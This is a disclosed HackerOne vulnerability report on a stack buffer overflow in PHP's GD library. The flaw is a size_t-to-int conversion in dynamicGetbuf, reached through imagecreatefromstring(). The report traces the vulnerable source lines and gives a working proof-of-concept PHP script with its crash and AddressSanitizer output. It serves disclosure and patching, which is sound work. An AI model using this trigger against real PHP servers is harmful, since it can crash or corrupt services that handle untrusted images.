# Stack Buffer Overflow in GD dynamicGetbuf

## Report Details
- **Report ID**: 175587
- **URL**: https://hackerone.com/reports/175587
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-10-13T12:19:33.057Z
- **Disclosed**: 2019-11-12T09:26:14.063Z

## Reporter
- **Username**: libnex
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
#Stack-based buffer over flow in GD dynamicGetbuf#
- Vulnerable function: imagecreatefromstring()
- Bug has been reported: https://bugs.php.net/bug.php?id=73280
- Submitted a patch and accepted: https://github.com/php/php-src/commit/cc08cbc84d46933c1e9e0149633f1ed5d19e45e9
- Impact: Remotely Exploitable. Given the nature of the function, it is not uncommon to see programmers passing user inputs to the vulnerable function imagecreatefromstring(). Real life examples:
  * https://github.com/rbloone/sslv-scraper/blob/305c79e24421795abdae8106ad686cb9c6742e94/img.php
  * https://github.com/hick/utl/blob/a573f04ac0a6db2cfe56e2785dfab7b1534c04f3/pasteimage/file.php

Description:
------------
1) imagecreatefromstring() takes in a string and attempts to convert it into an image. The string is in the variable "data" and the length is stored as size_t (unsigned) within a zend_string structure as seen below. When passed into gdNewDynamicCtxEx(), it gets converted implicitly into an int (signed). If the MSB of the size_t is 1, when converting to an int, this becomes a negative number.

_php_image_create_from_string(...) at php-7.0.11/ext/gd/gd.c:2227
	
```c
2227                 io_ctx = gdNewDynamicCtxEx(Z_STRLEN_P(data), Z_STRVAL_P(data), 0);
```

2) Tracing the code deeper, the size is set to dp (dynamicPtr) below

allocDynamic(...) at ext/gd/libgd/gd_io_dp.c:272
```c
280                 dp->logicalSize = initialSize;
```



3) During the image conversion, dynamicGetchar() gets called to read 1 byte (line 257).

dynamicGetchar(..) at ext/gd/libgd/gd_io_dp.c
```c
	254             unsigned char b;
	255             int rv;
	256
	257             rv = dynamicGetbuf (ctx, &b, 1);
```


4) Tracing into dynamicGetbuf(), because "remain" (line 236) is negative due to the int conversion, line 243 gets executed and more than 1 byte will be memcpy (line 246). This memcpy would copy bytes to "bu"f which is 1-byte char on the stack. This results in a stack buffer over flow.

dynamicGetbuf (gdIOCtxPtr ctx, void *buf, int len) at ext/gd/libgd/gd_io_dp.c:237
```c
236             remain = dp->logicalSize - dp->pos;
237             if (remain >= len) {
238                     rlen = len;
239             } else {
240                     if (remain == 0) {
241                             return EOF;
242                     }
243                     rlen = remain;
244             }
245
246         memcpy(buf, (void *) ((char *) dp->data + dp->pos), rlen);
```


Test script:
---------------
```php
<?php
ini_set('memory_limit',-1);
$var_3  =  str_repeat("A",4294967286); //Note that although this is a large string, over HTTP gz compression, it's going to be less than 1kb
$var_3[0]="\x00";
$var_3[1]="\x00";
$var_3[2]="\x00";
$var_3[3]="\x00";
$var_3[4]="\x00";
$var_3[5]="\x00";
$var_3[6]="\x00";
$var_3[7]="\x00";
imagecreatefromstring($var_3);

?>
```

$> ./php-7.0.11 test.php
Segmentation fault

Address Sanitizer result
```
ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffd246d5520 at pc 0x99119a bp 0x7ffd246d5480 sp 0x7ffd246d5478
WRITE of size 18446744073709551606 at 0x7ffd246d5520 thread T0
    #0 0x991199 in dynamicGetbuf /home/elaw/php-7.0.9/ext/gd/libgd/gd_io_dp.c:246
    #1 0x991263 in dynamicGetchar /home/elaw/php-7.0.9/ext/gd/libgd/gd_io_dp.c:257
    #2 0x98feaf in php_gd_gdGetC /home/elaw/php-7.0.9/ext/gd/libgd/gd_io.c:73
    #3 0x9a501c in php_gd_gd_getin /home/elaw/php-7.0.9/ext/gd/libgd/gd_wbmp.c:81
....
```

## Attachments
No attachments
